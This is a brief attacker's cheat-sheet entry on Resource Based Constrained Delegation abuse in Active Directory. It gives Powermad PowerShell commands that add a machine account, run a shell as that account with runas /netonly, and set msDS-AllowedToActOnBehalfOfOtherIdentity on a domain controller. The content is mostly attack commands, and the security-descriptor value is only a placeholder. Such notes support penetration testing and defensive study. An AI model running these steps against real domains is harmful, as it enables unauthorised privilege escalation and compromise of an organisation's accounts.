
## [[Resource Based Constrained Delegation (RBCD)]]
Add a new machine account
> New-MachineAccount -MachineAccount test

Use the added account with runas /netonly
> runas /netonly /user:domain\test$ powershell

Set the `msDS-AllowedToActOnBehalfOfOtherIdentity` to the current machine
> Set-MachineAccountAttribute -MachineName dc-1 -Attribute msDS-AllowedToActOnBehalfOfOtherIdentity -Value test-securitydesciptor

```meta
requirements: 
results: 
oss: #ps1
source: https://github.com/Kevin-Robertson/Powermad
description: PowerShell MachineAccountQuota and DNS exploit tools
```